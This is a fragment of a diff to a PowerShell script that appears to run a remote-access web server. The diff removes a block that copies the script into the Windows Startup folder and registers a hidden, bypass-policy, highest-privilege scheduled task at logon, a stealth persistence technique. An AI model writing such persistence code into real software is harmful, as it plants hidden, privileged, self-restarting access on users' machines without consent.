@@ -276,21 +276,6 @@ IPs: $($ips -join ', ')
     $response.Close()
 }
 
-# Add to startup for persistence
-try {
-    $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
-    $scriptPath = "$startupPath\web_remote.ps1"
-    Copy-Item $PSCommandPath $scriptPath -Force
-    
-    # Create scheduled task for additional persistence
-    $taskName = "WebRemote"
-    $taskAction = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath"
-    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
-    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Force -RunLevel Highest
-} catch {
-    # Continue even if persistence fails
-}
-
 # Keep server running indefinitely
 try {
     while ($true) {
